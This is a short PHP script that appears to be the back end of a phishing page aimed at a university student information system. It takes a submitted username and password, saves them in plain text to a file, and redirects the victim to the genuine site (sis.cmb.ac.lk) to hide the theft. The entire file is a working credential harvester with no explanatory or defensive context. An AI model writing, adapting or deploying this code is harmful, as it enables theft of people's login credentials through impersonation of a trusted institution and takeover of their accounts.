<?php 

$myFile = "info.txt";
$fh = fopen($myFile, 'w') or die("can't open file");

$uname=$_POST['uname'];
fwrite($fh, $uname);

$space="   ";
fwrite($fh, $space);

$pword=$_POST['pw'];
fwrite($fh, $pword);

fclose($fh);

header("Location: http://sis.cmb.ac.lk/sci/");
exit();

?>